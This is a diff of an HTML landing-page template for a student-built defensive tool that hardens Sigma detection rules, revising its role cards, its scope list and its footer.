-   <div class="lp-card"><h3>🧑‍⚖️ Approver</h3><p>Is this change safe to ship? ({waiting})</p>
-    <div class="go">{_link("review", "Review queue →", "ghost")}</div></div>
-   <div class="lp-card"><h3>🗂️ Manager</h3><p>A clear summary I can forward.</p>
-    <div class="go">{_link("reports", "Build a report →", "ghost")}</div></div>
+  <h2>Who it's for</h2>
+  <p class="lead">One workspace, four jobs. Start where yours is.</p>
+  <div class="lp-roles">
+   <div class="lp-card"><b>📊 SOC lead</b><p>Where are we exposed, and what do we fix first?</p>
+    <div class="go">{_link("coverage", "Coverage map →", "line small")}</div></div>
+   <div class="lp-card"><b>🧑‍💻 Detection engineer</b><p>A report came in: are we covered, and can we fix it?</p>
+    <div class="go">{_link("request", "Check a threat →", "line small")}</div></div>
+   <div class="lp-card"><b>🧑‍⚖️ Approver</b><p>Is this change safe to ship? ({waiting})</p>
+    <div class="go">{_link("review", "Review queue →", "line small")}</div></div>
+   <div class="lp-card"><b>🗂️ Manager</b><p>A clear summary to forward.</p>
+    <div class="go">{_link("reports", "Build a report →", "line small")}</div></div>
   </div>
  </div>
 
  <div class="lp-sec">
   <h2>Scope, honestly</h2>
   <div class="lp-scope">
-   <div class="lp-card"><h3>What it does today</h3><ul>
-    <li>Windows process-creation rules (Sysmon event 1) in Sigma, the open standard</li>
-    <li>Five published evasion tricks across 19 attacker techniques</li>
+   <div class="lp-card"><b>What it does</b><ul>
+    <li>Sigma rules for Windows process creation (Sysmon event 1)</li>
+    <li>The five published evasion tricks, across 19 attacker techniques</li>
     <li>Hardens rules, writes missing ones, checks for false alarms</li>
-    <li>Exports approved rules as Sigma or Elastic queries (Lucene, EQL)</li>
-    <li>Records every agent step, its cost and every decision</li></ul></div>
-   <div class="lp-card"><h3>What it does not do (yet)</h3><ul>
-    <li>It is not a SIEM and doesn't watch live logs: it improves the rules a SIEM runs</li>
-    <li>Not connected to a SIEM: approved queries are exported and pasted</li>
+    <li>Exports to Elastic (EQL recommended), with an audit trail of every step</li></ul></div>
+   <div class="lp-card"><b>What it doesn't (yet)</b><ul>
+    <li>It isn't a SIEM and doesn't watch live logs; it improves the rules a SIEM runs</li>
+    <li>Not connected to your SIEM: approved queries are exported</li>
     <li>Attack variations are generated from Atomic Red Team, not captured from a breach</li>
-    <li>No rule is evasion-proof: it raises and measures resistance to known tricks</li>
-    <li>Linux, cloud and other log sources are out of scope</li></ul></div>
+    <li>No rule is evasion-proof; it raises and measures resistance to known tricks</li></ul></div>
   </div>
  </div>
 
- <div class="lp-note">🛡️ <b>Decision support, not autopilot.</b> Every rule change is reviewed by a person before
-  deployment. Results are measured on generated attack variations and a fixed set of look-alike commands;
-  your environment may differ. *Uetz et al., USENIX Security 2024.</div>
-
- <div class="lp-foot">EECE 798S Agentic Systems · American University of Beirut · Fall 2026 · Rules: SigmaHQ (DRL 1.1) ·
-  Attacks: Atomic Red Team (MIT)<br>{_link("coverage", "Open the platform", "small")}
-  <a href="?page=operations" target="_self">How we evaluated it</a></div>
+ <div class="lp-foot">Decision support, not autopilot: every rule change is approved by a person.<br>
+  EECE 798S Agentic Systems · American University of Beirut · Fall 2026 · Rules: SigmaHQ (DRL 1.1) · Attacks: Atomic Red Team (MIT)<br>
+  {_link("coverage", "Open the platform", "fire small")} <a href="?page=operations" target="_self">How we evaluated it</a></div>
 </div>
 """
 
